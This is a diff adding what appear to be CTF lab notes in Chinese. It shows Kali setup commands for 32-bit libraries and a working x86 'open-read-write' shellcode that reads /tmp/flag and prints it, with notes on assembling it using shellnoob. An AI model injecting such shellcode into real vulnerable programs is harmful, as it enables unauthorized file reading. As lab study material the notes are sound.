@@ -80,3 +80,60 @@ unsigned int get_flag()
 }
 
 ```
+#lab2
+
+kali 2017.2 x64 添加32位支持
+
+```
+echo "deb http://mirrors.ustc.edu.cn/kali kali-rolling  main non-free contrib" > /etc/apt/sources.list
+
+dpkg --add-architecture i386
+
+apt-get update
+
+apt-get install lib32z1 lib32ncurses5
+
+```
+
+orw=open,read,write
+shellcode sc.asm:
+
+```
+        jmp file
+open :
+        pop ebx
+        xor eax,eax
+        mov al,5
+        xor ecx,ecx
+        int 0x80
+
+
+        mov ebx,eax
+        mov al,3
+        mov ecx,esp
+        mov dl,0x30
+        int 0x80
+
+        mov al,4
+        mov bl,1
+        mov dl,0x30
+        int 0x80
+
+        xor eax,eax
+        inc eax
+        int 0x80
+
+file :
+        call open
+        db '/tmp/flag',0x0
+```
+
+工具[shellnoob](https://github.com/reyammer/shellnoob)
+
+snoob --intel --from-asm sc.asm --to-bin
+
+note:
+
+默认ATT，所以加上--intel,汇编最后一句db...去掉，会报错。
+使用cat sc.bin | disasm检查
+最后的shellocde为open('sc.bin').read()+'/tmp/flag\x00'
